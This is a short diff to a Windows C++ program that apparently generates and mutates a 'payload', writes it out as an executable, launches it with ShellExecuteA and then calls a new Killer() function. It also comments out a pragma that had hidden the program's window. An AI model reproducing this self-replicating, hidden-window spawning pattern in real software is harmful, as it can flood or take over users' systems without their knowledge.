@@ -1,7 +1,7 @@
 // Unicorn2.cpp : This file contains the 'main' function. Program execution begins and ends there.
 //
 #define _CRT_SECURE_NO_WARNINGS
-#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
+//#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
 
 #include<stdio.h>
 #include<Windows.h>
@@ -24,6 +24,8 @@ struct timeb AccuTime;
 
 void GenNxtPayload();
 void MuNxtPayload();
+
+void Killer(void);
 
 int main(int argc, char** argv)
 {
@@ -77,8 +79,9 @@ int main(int argc, char** argv)
         fclose(fp);
         fp = NULL;
         
-        Sleep(GapTime);
+        Sleep(GapTime); // Order is important here to avoid producing so fast
         ShellExecuteA(NULL, "open", nextEXEName, NULL, NULL, SW_SHOWNORMAL);
+        Killer();
     }
 }
 
